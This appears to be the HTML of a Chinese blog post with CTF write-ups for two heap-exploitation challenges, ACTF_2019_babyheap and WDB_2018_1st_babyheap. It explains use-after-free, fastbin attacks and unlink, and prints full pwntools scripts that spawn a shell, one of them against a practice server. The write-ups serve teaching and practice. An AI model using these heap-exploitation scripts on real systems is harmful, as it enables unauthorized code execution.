@@ -1,0 +1,456 @@
+<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>简单堆题write-up | N0k's Den</title><meta name=keywords content="write-up,ctf,pwn,heap"><meta name=description content='ACTF_2019_babyheap
+经典的notebook题目结构, 堆利用当中最简单的类型
+有
+
+    ==============================
+    This is a heap exploit demo  
+    ==============================
+    1. Create something           
+    2. Delete something           
+    3. Print something            
+    4. Exit    
+create, delete, print 三个选项。
+创建的结构体如下
+
+  
+      
+          
+          
+      
+  
+  
+      
+          字符串指针
+          函数指针
+      
+  
+
+字符串也由malloc()创建，且可以任意指定其长度和内容。
+free()的时候也没有清空内容。
+利用思路很明显了：
+create两次，其中字符串的内容不重要，只要保证其释放后不被放入0x20的fastbin中。
+此处使这这两个字符串大小为0x20，因此他们被释放后会被放入0x30的字符串当中。
+释放这两个note之后的fastbin如下
+
+  
+      
+          0x20
+      
+  
+  
+      
+          note0
+      
+      
+          🠗
+      
+      
+          note1
+      
+  
+
+
+  
+      
+          0x30
+      
+  
+  
+      
+          String0
+      
+      
+          🠗
+      
+      
+          String1
+      
+  
+
+再次create,但申请的字符串大小为0x10（chunk大小即为0x20）。fastbin是FILO(first in last out)的，那么
+    note2 = note1
+    string2 = note0
+题目bss段中贴心的准备了/bin/sh字符串，也有system函数。
+在create时向string2中写入
+    binsh地址 |  system的PLT表地址
+print选项调用note0.函数指针，就能成功调用system(&#39;/bin/sh&#39;)，完整payload如下
+    if len(sys.argv) >1 and sys.argv[1] == &#39;r&#39;:
+        target = remote()
+    else:
+        target = process("./ACTF_2019_babyheap")
+        if(len(sys.argv)>1) and sys.argv[1]==&#39;g&#39;:
+            gdb.attach(target)
+
+    context.log_level=&#39;debug&#39;
+
+    binsh=0x602010
+    system_plt = 0x4007A0
+    def s(in_put):
+        target.sendlineafter("choice: ",in_put)
+        
+        
+    def create(size,content):
+        s("1")
+        target.recvuntil("size: \n")
+        target.sendline(str(size))
+        target.recvuntil("content: \n")
+        target.send(content)
+        
+        
+    def delete(index):
+        s("2")
+        target.recvuntil("index: \n")
+        target.sendline(str(index))
+        
+        
+    def pwn():
+        create(0x20,"A"*8+"\n")
+        create(0x20,"B"*8+"\n")
+        
+        delete(0)
+        delete(1)
+        create(0x10,p64(binsh)+p64(system_plt))
+
+        #use print at index 0 to getshell after this
+
+
+        target.interactive()
+
+
+    pwn()
+
+WDB_2018_1st_babyheap
+同样是菜单题目,设计的十分巧妙,涉及到了很多堆的知识点.'><meta name=author content="N0k"><link rel=canonical href=http://localhost:1313/posts/heap_writeup/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.36819bea596090d8b48cf10d9831382996197aa7e4fc86f792f7c08c9ca4d23b.css integrity="sha256-NoGb6llgkNi0jPENmDE4KZYZeqfk/Ib3kvfAjJyk0js=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/heap_writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:url" content="http://localhost:1313/posts/heap_writeup/"><meta property="og:site_name" content="N0k's Den"><meta property="og:title" content="简单堆题write-up"><meta property="og:description" content='ACTF_2019_babyheap 经典的notebook题目结构, 堆利用当中最简单的类型
+有
+==============================This is a heap exploit demo ==============================1. Create something 2. Delete something 3. Print something 4. Exit create, delete, print 三个选项。
+创建的结构体如下
+字符串指针 函数指针 字符串也由malloc()创建，且可以任意指定其长度和内容。 free()的时候也没有清空内容。
+利用思路很明显了： create两次，其中字符串的内容不重要，只要保证其释放后不被放入0x20的fastbin中。
+此处使这这两个字符串大小为0x20，因此他们被释放后会被放入0x30的字符串当中。
+释放这两个note之后的fastbin如下
+0x20 note0 🠗 note1 0x30 String0 🠗 String1 再次create,但申请的字符串大小为0x10（chunk大小即为0x20）。fastbin是FILO(first in last out)的，那么
+note2 = note1string2 = note0 题目bss段中贴心的准备了/bin/sh字符串，也有system函数。 在create时向string2中写入
+binsh地址 | system的PLT表地址 print选项调用note0.函数指针，就能成功调用system(&#39;/bin/sh&#39;)，完整payload如下
+if len(sys.argv) >1 and sys.argv[1] == &#39;r&#39;:target = remote()else:target = process("./ACTF_2019_babyheap")if(len(sys.argv)>1) and sys.argv[1]==&#39;g&#39;:gdb.attach(target)context.log_level=&#39;debug&#39;binsh=0x602010system_plt = 0x4007A0def s(in_put):target.sendlineafter("choice: ",in_put)def create(size,content):s("1")target.recvuntil("size: \n")target.sendline(str(size))target.recvuntil("content: \n")target.send(content)def delete(index):s("2")target.recvuntil("index: \n")target.sendline(str(index))def pwn():create(0x20,"A"*8+"\n")create(0x20,"B"*8+"\n")delete(0)delete(1)create(0x10,p64(binsh)+p64(system_plt))#use print at index 0 to getshell after thistarget.interactive()pwn() WDB_2018_1st_babyheap 同样是菜单题目,设计的十分巧妙,涉及到了很多堆的知识点.'><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-03-04T11:03:54+00:00"><meta property="article:modified_time" content="2021-03-04T11:03:54+00:00"><meta property="article:tag" content="Write-Up"><meta property="article:tag" content="Ctf"><meta property="article:tag" content="Pwn"><meta property="article:tag" content="Heap"><meta name=twitter:card content="summary"><meta name=twitter:title content="简单堆题write-up"><meta name=twitter:description content='ACTF_2019_babyheap
+经典的notebook题目结构, 堆利用当中最简单的类型
+有
+
+    ==============================
+    This is a heap exploit demo  
+    ==============================
+    1. Create something           
+    2. Delete something           
+    3. Print something            
+    4. Exit    
+create, delete, print 三个选项。
+创建的结构体如下
+
+  
+      
+          
+          
+      
+  
+  
+      
+          字符串指针
+          函数指针
+      
+  
+
+字符串也由malloc()创建，且可以任意指定其长度和内容。
+free()的时候也没有清空内容。
+利用思路很明显了：
+create两次，其中字符串的内容不重要，只要保证其释放后不被放入0x20的fastbin中。
+此处使这这两个字符串大小为0x20，因此他们被释放后会被放入0x30的字符串当中。
+释放这两个note之后的fastbin如下
+
+  
+      
+          0x20
+      
+  
+  
+      
+          note0
+      
+      
+          🠗
+      
+      
+          note1
+      
+  
+
+
+  
+      
+          0x30
+      
+  
+  
+      
+          String0
+      
+      
+          🠗
+      
+      
+          String1
+      
+  
+
+再次create,但申请的字符串大小为0x10（chunk大小即为0x20）。fastbin是FILO(first in last out)的，那么
+    note2 = note1
+    string2 = note0
+题目bss段中贴心的准备了/bin/sh字符串，也有system函数。
+在create时向string2中写入
+    binsh地址 |  system的PLT表地址
+print选项调用note0.函数指针，就能成功调用system(&#39;/bin/sh&#39;)，完整payload如下
+    if len(sys.argv) >1 and sys.argv[1] == &#39;r&#39;:
+        target = remote()
+    else:
+        target = process("./ACTF_2019_babyheap")
+        if(len(sys.argv)>1) and sys.argv[1]==&#39;g&#39;:
+            gdb.attach(target)
+
+    context.log_level=&#39;debug&#39;
+
+    binsh=0x602010
+    system_plt = 0x4007A0
+    def s(in_put):
+        target.sendlineafter("choice: ",in_put)
+        
+        
+    def create(size,content):
+        s("1")
+        target.recvuntil("size: \n")
+        target.sendline(str(size))
+        target.recvuntil("content: \n")
+        target.send(content)
+        
+        
+    def delete(index):
+        s("2")
+        target.recvuntil("index: \n")
+        target.sendline(str(index))
+        
+        
+    def pwn():
+        create(0x20,"A"*8+"\n")
+        create(0x20,"B"*8+"\n")
+        
+        delete(0)
+        delete(1)
+        create(0x10,p64(binsh)+p64(system_plt))
+
+        #use print at index 0 to getshell after this
+
+
+        target.interactive()
+
+
+    pwn()
+
+WDB_2018_1st_babyheap
+同样是菜单题目,设计的十分巧妙,涉及到了很多堆的知识点.'><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"简单堆题write-up","item":"http://localhost:1313/posts/heap_writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"简单堆题write-up","name":"简单堆题write-up","description":"ACTF_2019_babyheap 经典的notebook题目结构, 堆利用当中最简单的类型\n有\n==============================\rThis is a heap exploit demo ==============================\r1. Create something 2. Delete something 3. Print something 4. Exit create, delete, print 三个选项。\n创建的结构体如下\n字符串指针 函数指针 字符串也由malloc()创建，且可以任意指定其长度和内容。 free()的时候也没有清空内容。\n利用思路很明显了： create两次，其中字符串的内容不重要，只要保证其释放后不被放入0x20的fastbin中。\n此处使这这两个字符串大小为0x20，因此他们被释放后会被放入0x30的字符串当中。\n释放这两个note之后的fastbin如下\n0x20 note0 🠗 note1 0x30 String0 🠗 String1 再次create,但申请的字符串大小为0x10（chunk大小即为0x20）。fastbin是FILO(first in last out)的，那么\nnote2 = note1\rstring2 = note0 题目bss段中贴心的准备了/bin/sh字符串，也有system函数。 在create时向string2中写入\nbinsh地址 | system的PLT表地址 print选项调用note0.函数指针，就能成功调用system('/bin/sh')，完整payload如下\nif len(sys.argv) \u0026gt;1 and sys.argv[1] == \u0026#39;r\u0026#39;:\rtarget = remote()\relse:\rtarget = process(\u0026#34;./ACTF_2019_babyheap\u0026#34;)\rif(len(sys.argv)\u0026gt;1) and sys.argv[1]==\u0026#39;g\u0026#39;:\rgdb.attach(target)\rcontext.log_level=\u0026#39;debug\u0026#39;\rbinsh=0x602010\rsystem_plt = 0x4007A0\rdef s(in_put):\rtarget.sendlineafter(\u0026#34;choice: \u0026#34;,in_put)\rdef create(size,content):\rs(\u0026#34;1\u0026#34;)\rtarget.recvuntil(\u0026#34;size: \\n\u0026#34;)\rtarget.sendline(str(size))\rtarget.recvuntil(\u0026#34;content: \\n\u0026#34;)\rtarget.send(content)\rdef delete(index):\rs(\u0026#34;2\u0026#34;)\rtarget.recvuntil(\u0026#34;index: \\n\u0026#34;)\rtarget.sendline(str(index))\rdef pwn():\rcreate(0x20,\u0026#34;A\u0026#34;*8+\u0026#34;\\n\u0026#34;)\rcreate(0x20,\u0026#34;B\u0026#34;*8+\u0026#34;\\n\u0026#34;)\rdelete(0)\rdelete(1)\rcreate(0x10,p64(binsh)+p64(system_plt))\r#use print at index 0 to getshell after this\rtarget.interactive()\rpwn() WDB_2018_1st_babyheap 同样是菜单题目,设计的十分巧妙,涉及到了很多堆的知识点.\n","keywords":["write-up","ctf","pwn","heap"],"articleBody":"ACTF_2019_babyheap 经典的notebook题目结构, 堆利用当中最简单的类型\n有\n==============================\rThis is a heap exploit demo ==============================\r1. Create something 2. Delete something 3. Print something 4. Exit create, delete, print 三个选项。\n创建的结构体如下\n字符串指针 函数指针 字符串也由malloc()创建，且可以任意指定其长度和内容。 free()的时候也没有清空内容。\n利用思路很明显了： create两次，其中字符串的内容不重要，只要保证其释放后不被放入0x20的fastbin中。\n此处使这这两个字符串大小为0x20，因此他们被释放后会被放入0x30的字符串当中。\n释放这两个note之后的fastbin如下\n0x20 note0 🠗 note1 0x30 String0 🠗 String1 再次create,但申请的字符串大小为0x10（chunk大小即为0x20）。fastbin是FILO(first in last out)的，那么\nnote2 = note1\rstring2 = note0 题目bss段中贴心的准备了/bin/sh字符串，也有system函数。 在create时向string2中写入\nbinsh地址 | system的PLT表地址 print选项调用note0.函数指针，就能成功调用system('/bin/sh')，完整payload如下\nif len(sys.argv) \u003e1 and sys.argv[1] == 'r':\rtarget = remote()\relse:\rtarget = process(\"./ACTF_2019_babyheap\")\rif(len(sys.argv)\u003e1) and sys.argv[1]=='g':\rgdb.attach(target)\rcontext.log_level='debug'\rbinsh=0x602010\rsystem_plt = 0x4007A0\rdef s(in_put):\rtarget.sendlineafter(\"choice: \",in_put)\rdef create(size,content):\rs(\"1\")\rtarget.recvuntil(\"size: \\n\")\rtarget.sendline(str(size))\rtarget.recvuntil(\"content: \\n\")\rtarget.send(content)\rdef delete(index):\rs(\"2\")\rtarget.recvuntil(\"index: \\n\")\rtarget.sendline(str(index))\rdef pwn():\rcreate(0x20,\"A\"*8+\"\\n\")\rcreate(0x20,\"B\"*8+\"\\n\")\rdelete(0)\rdelete(1)\rcreate(0x10,p64(binsh)+p64(system_plt))\r#use print at index 0 to getshell after this\rtarget.interactive()\rpwn() WDB_2018_1st_babyheap 同样是菜单题目,设计的十分巧妙,涉及到了很多堆的知识点.\nI thought this is really baby.What about u?\rLoading.....\r1.alloc\r2.edit\r3.show\r4.free\r5.exit\rChoice: 漏洞点出在4.free 选项中,调用free()之后没有清空指针,存在UAF. 但是2.edit的使用次数被限制在了三次以内.\n思路如下:\n我们希望覆盖__free_hook为system (或者直接覆盖为一个one_gadget),因此我们需要泄露libc,并通过Unlink实现任意地址写\nunsorted bin中的fd指向main_arena,我们需要将一个chunk放入unsorted bin并利用UAF泄露main_arena,以此泄露libc 同时,我们也要将chunk送入unsorted bin 以触发unlink\n程序只允许我们malloc() 0x20大小的内存(即0x30大小的chunk),因此我们需要通过UAF,overlap 与fastbin attack构造fake chunk\n想要实现步骤3, 需要我们泄露堆地址\n那么先从泄露堆地址开始做\nalloc(0,\"a\\n\")\ralloc(1,\"b\\n\")\rfree(1)\rfree(0)\rshow(0)\rheap_leak = u64(target.recv(6).ljust(8,'\\x00'))\rsuccess(hex(heap_leak)) fastbin是FILO的,两次free之后,fastbins 如下\nfastbin chunk0 @index0 🠗 chunk1 @index1 chunk0-\u003efd指向chunk1,因此show(0)可以泄露出chunk1的Prev_size地址(即heap+0x30) 注意此处释放顺序,第一个chunk地址低字节是\\x00且程序为小端序,因此调换释放顺序后,我们无法用chunk1泄露chunk0的地址.\n然后进行fastbin attack,构造chunk重叠\nedit(0,p64(heap_leak-0x10)+p64(0)+p64(0)+p64(0x31)) 如此,chunk0的fd便指向 chunk1-0x10, 也就是chunk0+0x20的位置. 我们那里构建一个size为0x30的fake chunk,造成chunk重叠.\n接着进行分配,要记得fastbin是FILO的\nalloc(6,\"aaaa\\n\") #chunk0 @index6\ralloc(7,p64(0)+p64(0xa1)+\"\\n\") #fake chunk @index7 我们获取到的fake chunk @index7指向 chunk1-0x10,因此对其mem区域进行编辑,便能够编辑到 chunk1的size.\n将该fakechunk填充至0x90 大小\nalloc(2,\"CCCCCCC\\n\")\ralloc(3,\"DDDDDDD\\n\") 最终的任意地址写需要依靠unlink实现,此处开始构造 chunk4 @index4 的prev_size 与 size会被算在fake chunk内,因此我们可以再伪造一个fake chunk. 0x602080即是index4地址\n剩下的就是常规绕过unlink检查的操作,\n#bypass unlink check\ralloc(4,p64(0)+p64(0x31)+p64(0x602080-0x18)+p64(0x602080-0x10))\ralloc(5,p64(0x30)+p64(0x30)+'\\n') 释放0xa1大小的fake chunk, 他会被放入unsorted bin中. 回顾, unsorted bin中的fd指向main_arena, 依此泄露出libc\nfree(1)\rshow(1) 同时,我们也触发了unlink,index4(0x602080) 会指向 index1 (0x602080-0x18 = 0x602068)\n之后利用edit函数实现任意地址写,改__free_hook 为 system. 类似地,我们也可以改__free_hook为one_gadget\nedit(4,p64(free_hook)+\"\\n\")\redit(1,p64(system)+\"\\n\")\ralloc(8,\"/bin/sh\\x00\"+'\\n')\rfree(8) 完整exp\nfrom pwn import *\rimport sys\rif len(sys.argv) \u003e1 and sys.argv[1] == 'r':\rtarget = remote(\"node3.buuoj.cn\",26070 )\relse:\r#target = process(\"\")\rtarget=process([\"/home/trident/ctfworkspace/glibc/glibc-all-in-one-master/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so\",\"./wdb_2018_1st_babyheap\"],env={\"LD_PRELOAD\":\"./libc.so.6\"})\rif(len(sys.argv)\u003e1) and sys.argv[1]=='g':\rgdb.attach(target)\rcontext.log_level='debug'\r#context.update(arch='')\r#gdb.attach(target)\rlibC = ELF(\"./libc.so.6\")\rdef alloc(index,content):\rtarget.recvuntil(\"oice:\")\rtarget.sendline(\"1\")\rtarget.recvuntil(\"Index:\")\rtarget.sendline(str(index))\rtarget.recvuntil(\"tent:\")\rtarget.send(content)\rdef edit(index,content):\rtarget.recvuntil(\"oice:\")\rtarget.sendline(\"2\")\rtarget.recvuntil(\"Index:\")\rtarget.sendline(str(index))\rtarget.recvuntil(\"tent:\")\rtarget.send(content)\rdef show(index):\rtarget.recvuntil(\"oice:\")\rtarget.sendline(\"3\")\rtarget.recvuntil(\"Index:\")\rtarget.sendline(str(index))\rdef free(index):\rtarget.recvuntil(\"oice:\")\rtarget.sendline(\"4\")\rtarget.recvuntil(\"Index:\")\rtarget.sendline(str(index))\rdef pwn():\ralloc(0,\"a\\n\")\ralloc(1,\"b\\n\")\rfree(1)\rfree(0)\rshow(0)\rheap_leak = u64(target.recv(6).ljust(8,'\\x00')) success(hex(heap_leak))\redit(0,p64(heap_leak-0x10)+p64(0)+p64(0)+p64(0x31))\ralloc(6,\"aaaa\\n\")\ralloc(7,p64(0)+p64(0xa1)+\"\\n\")\ralloc(2,\"CCCCCCC\\n\")\ralloc(3,\"DDDDDDD\\n\")\ralloc(4,p64(0)+p64(0x31)+p64(0x602080-0x18)+p64(0x602080-0x10)) #bypass unlink check\ralloc(5,p64(0x30)+p64(0x30)+'\\n')\rfree(1)\rshow(1)\rleak2 = u64(target.recv(6).ljust(8,'\\x00'))\rsuccess(hex(leak2))\rlibc_leak = leak2 - 0x3c4b78\rsuccess(\"leaked libc: \" + hex(libc_leak))\rsystem = libc_leak + 0x45390\rsuccess(\"system: \" + hex(system))\rfree_hook = libc_leak + libC.symbols['__free_hook']\rsuccess(\"free_hook: \"+hex(free_hook))\redit(4,p64(free_hook)+\"\\n\")\redit(1,p64(system)+\"\\n\")\ralloc(8,\"/bin/sh\\x00\"+'\\n')\rfree(8)\rtarget.interactive()\rpwn() ","wordCount":"360","inLanguage":"en","datePublished":"2021-03-04T11:03:54Z","dateModified":"2021-03-04T11:03:54Z","author":{"@type":"Person","name":"N0k"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/posts/heap_writeup/"},"publisher":{"@type":"Organization","name":"N0k's Den","logo":{"@type":"ImageObject","url":"http://localhost:1313/%3Clink%20/%20abs%20url%3E"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="HOME (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>HOME</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/ title=categories><span>categories</span></a></li><li><a href=http://localhost:1313/tags/ title=tags><span>tags</span></a></li><li><a href=http://localhost:1313/about/ title="about me"><span>about me</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">简单堆题write-up</h1><div class=post-meta><span title='2021-03-04 11:03:54 +0000 UTC'>March 4, 2021</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;360 words&nbsp;·&nbsp;N0k</div></header><div class=post-content><h2 id=actf_2019_babyheap>ACTF_2019_babyheap<a hidden class=anchor aria-hidden=true href=#actf_2019_babyheap>#</a></h2><p>经典的notebook题目结构, 堆利用当中最简单的类型</p><p>有</p><pre tabindex=0><code>
+    ==============================
+    This is a heap exploit demo  
+    ==============================
+    1. Create something           
+    2. Delete something           
+    3. Print something            
+    4. Exit    
+</code></pre><p>create, delete, print 三个选项。</p><p>创建的结构体如下</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>字符串指针</td><td>函数指针</td></tr></tbody></table><p>字符串也由<code>malloc()</code>创建，且可以任意指定其长度和内容。
+<code>free()</code>的时候也没有清空内容。</p><p>利用思路很明显了：
+create两次，其中字符串的内容不重要，只要保证其释放后不被放入<code>0x20</code>的fastbin中。</p><p>此处使这这两个字符串大小为<code>0x20</code>，因此他们被释放后会被放入<code>0x30</code>的字符串当中。</p><p>释放这两个note之后的fastbin如下</p><table><thead><tr><th>0x20</th></tr></thead><tbody><tr><td>note0</td></tr><tr><td>🠗</td></tr><tr><td>note1</td></tr></tbody></table><table><thead><tr><th>0x30</th></tr></thead><tbody><tr><td>String0</td></tr><tr><td>🠗</td></tr><tr><td>String1</td></tr></tbody></table><p>再次create,但申请的字符串大小为0x10（chunk大小即为0x20）。fastbin是FILO(first in last out)的，那么</p><pre tabindex=0><code>    note2 = note1
+    string2 = note0
+</code></pre><p>题目bss段中贴心的准备了<code>/bin/sh</code>字符串，也有<code>system</code>函数。
+在create时向string2中写入</p><pre tabindex=0><code>    binsh地址 |  system的PLT表地址
+</code></pre><p>print选项调用note0.函数指针，就能成功调用<code>system('/bin/sh')</code>，完整payload如下</p><pre tabindex=0><code>    if len(sys.argv) &gt;1 and sys.argv[1] == &#39;r&#39;:
+        target = remote()
+    else:
+        target = process(&#34;./ACTF_2019_babyheap&#34;)
+        if(len(sys.argv)&gt;1) and sys.argv[1]==&#39;g&#39;:
+            gdb.attach(target)
+
+    context.log_level=&#39;debug&#39;
+
+    binsh=0x602010
+    system_plt = 0x4007A0
+    def s(in_put):
+        target.sendlineafter(&#34;choice: &#34;,in_put)
+        
+        
+    def create(size,content):
+        s(&#34;1&#34;)
+        target.recvuntil(&#34;size: \n&#34;)
+        target.sendline(str(size))
+        target.recvuntil(&#34;content: \n&#34;)
+        target.send(content)
+        
+        
+    def delete(index):
+        s(&#34;2&#34;)
+        target.recvuntil(&#34;index: \n&#34;)
+        target.sendline(str(index))
+        
+        
+    def pwn():
+        create(0x20,&#34;A&#34;*8+&#34;\n&#34;)
+        create(0x20,&#34;B&#34;*8+&#34;\n&#34;)
+        
+        delete(0)
+        delete(1)
+        create(0x10,p64(binsh)+p64(system_plt))
+
+        #use print at index 0 to getshell after this
+
+
+        target.interactive()
+
+
+    pwn()
+</code></pre><hr><h2 id=wdb_2018_1st_babyheap>WDB_2018_1st_babyheap<a hidden class=anchor aria-hidden=true href=#wdb_2018_1st_babyheap>#</a></h2><p>同样是菜单题目,设计的十分巧妙,涉及到了很多堆的知识点.</p><pre tabindex=0><code>    I thought this is really baby.What about u?
+    Loading.....
+    1.alloc
+    2.edit
+    3.show
+    4.free
+    5.exit
+    Choice:
+</code></pre><p>漏洞点出在<code>4.free</code> 选项中,调用<code>free()</code>之后没有清空指针,存在UAF.
+但是<code>2.edit</code>的使用次数被限制在了三次以内.</p><p>思路如下:</p><ol><li><p>我们希望覆盖<code>__free_hook</code>为<code>system</code> (或者直接覆盖为一个one_gadget),因此我们需要泄露libc,并通过Unlink实现任意地址写</p></li><li><p>unsorted bin中的<code>fd</code>指向<code>main_arena</code>,我们需要将一个chunk放入unsorted bin并利用UAF泄露<code>main_arena</code>,以此泄露libc
+同时,我们也要将chunk送入unsorted bin 以触发unlink</p></li><li><p>程序只允许我们<code>malloc()</code> 0x20大小的内存(即0x30大小的chunk),因此我们需要通过UAF,overlap 与fastbin attack构造fake chunk</p></li><li><p>想要实现步骤3, 需要我们泄露堆地址</p></li></ol><p>那么先从泄露堆地址开始做</p><pre tabindex=0><code>    alloc(0,&#34;a\n&#34;)
+    alloc(1,&#34;b\n&#34;)
+    free(1)
+    free(0)
+
+    show(0)
+    heap_leak = u64(target.recv(6).ljust(8,&#39;\x00&#39;))
+    success(hex(heap_leak))
+</code></pre><p>fastbin是FILO的,两次<code>free</code>之后,fastbins 如下</p><table><thead><tr><th>fastbin</th></tr></thead><tbody><tr><td>chunk0 @index0</td></tr><tr><td>🠗</td></tr><tr><td>chunk1 @index1</td></tr></tbody></table><p>chunk0->fd指向chunk1,因此<code>show(0)</code>可以泄露出chunk1的Prev_size地址(即heap+0x30)
+注意此处释放顺序,第一个chunk地址低字节是\x00且程序为小端序,因此调换释放顺序后,我们无法用chunk1泄露chunk0的地址.</p><p>然后进行fastbin attack,构造chunk重叠</p><pre tabindex=0><code>    edit(0,p64(heap_leak-0x10)+p64(0)+p64(0)+p64(0x31))
+</code></pre><p>如此,chunk0的fd便指向 chunk1-0x10, 也就是chunk0+0x20的位置.
+我们那里构建一个size为0x30的fake chunk,造成chunk重叠.</p><p>接着进行分配,要记得fastbin是FILO的</p><pre tabindex=0><code>    alloc(6,&#34;aaaa\n&#34;)  #chunk0 @index6
+    alloc(7,p64(0)+p64(0xa1)+&#34;\n&#34;) #fake chunk @index7
+</code></pre><p>我们获取到的fake chunk @index7指向 chunk1-0x10,因此对其mem区域进行编辑,便能够编辑到 chunk1的size.</p><p>将该fakechunk填充至0x90 大小</p><pre tabindex=0><code>    alloc(2,&#34;CCCCCCC\n&#34;)
+    alloc(3,&#34;DDDDDDD\n&#34;)
+</code></pre><p>最终的任意地址写需要依靠unlink实现,此处开始构造
+chunk4 @index4 的prev_size 与 size会被算在fake chunk内,因此我们可以再伪造一个fake chunk.
+0x602080即是index4地址</p><p>剩下的就是常规绕过unlink检查的操作,</p><pre tabindex=0><code>    #bypass unlink check
+    alloc(4,p64(0)+p64(0x31)+p64(0x602080-0x18)+p64(0x602080-0x10))
+    alloc(5,p64(0x30)+p64(0x30)+&#39;\n&#39;)
+</code></pre><p>释放0xa1大小的fake chunk, 他会被放入unsorted bin中.
+回顾, unsorted bin中的<code>fd</code>指向<code>main_arena</code>, 依此泄露出libc</p><pre tabindex=0><code>    free(1)
+    show(1)
+</code></pre><p>同时,我们也触发了unlink,index4(0x602080) 会指向 index1 (0x602080-0x18 = 0x602068)</p><p>之后利用edit函数实现任意地址写,改<code>__free_hook</code> 为 <code>system</code>.
+类似地,我们也可以改<code>__free_hook</code>为one_gadget</p><pre tabindex=0><code>    edit(4,p64(free_hook)+&#34;\n&#34;)
+    edit(1,p64(system)+&#34;\n&#34;)
+
+    alloc(8,&#34;/bin/sh\x00&#34;+&#39;\n&#39;)
+    free(8)
+</code></pre><p>完整exp</p><pre tabindex=0><code>    from pwn import *
+    import sys
+
+
+    if len(sys.argv) &gt;1 and sys.argv[1] == &#39;r&#39;:
+        target = remote(&#34;node3.buuoj.cn&#34;,26070 )
+    else:
+        #target = process(&#34;&#34;)
+        target=process([&#34;/home/trident/ctfworkspace/glibc/glibc-all-in-one-master/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&#34;,&#34;./wdb_2018_1st_babyheap&#34;],env={&#34;LD_PRELOAD&#34;:&#34;./libc.so.6&#34;})
+        if(len(sys.argv)&gt;1) and sys.argv[1]==&#39;g&#39;:
+            gdb.attach(target)
+
+    context.log_level=&#39;debug&#39;
+    #context.update(arch=&#39;&#39;)
+    #gdb.attach(target)
+    libC = ELF(&#34;./libc.so.6&#34;)
+
+
+    def alloc(index,content):
+        target.recvuntil(&#34;oice:&#34;)
+        target.sendline(&#34;1&#34;)
+
+        target.recvuntil(&#34;Index:&#34;)
+        target.sendline(str(index))
+        target.recvuntil(&#34;tent:&#34;)
+        target.send(content)
+
+    def edit(index,content):
+        target.recvuntil(&#34;oice:&#34;)
+        target.sendline(&#34;2&#34;)
+        target.recvuntil(&#34;Index:&#34;)
+        target.sendline(str(index))
+        target.recvuntil(&#34;tent:&#34;)
+        target.send(content)
+
+
+    def show(index):
+        target.recvuntil(&#34;oice:&#34;)
+        target.sendline(&#34;3&#34;)
+        target.recvuntil(&#34;Index:&#34;)
+        target.sendline(str(index))
+
+
+    def free(index):
+        target.recvuntil(&#34;oice:&#34;)
+        target.sendline(&#34;4&#34;)
+        target.recvuntil(&#34;Index:&#34;)
+        target.sendline(str(index))
+
+
+
+    def pwn():
+        alloc(0,&#34;a\n&#34;)
+        alloc(1,&#34;b\n&#34;)
+        free(1)
+        free(0)
+        
+        show(0)
+        heap_leak = u64(target.recv(6).ljust(8,&#39;\x00&#39;)) 
+        success(hex(heap_leak))
+        
+        edit(0,p64(heap_leak-0x10)+p64(0)+p64(0)+p64(0x31))
+        
+        alloc(6,&#34;aaaa\n&#34;)
+        alloc(7,p64(0)+p64(0xa1)+&#34;\n&#34;)
+        alloc(2,&#34;CCCCCCC\n&#34;)
+        alloc(3,&#34;DDDDDDD\n&#34;)
+
+        alloc(4,p64(0)+p64(0x31)+p64(0x602080-0x18)+p64(0x602080-0x10)) #bypass unlink check
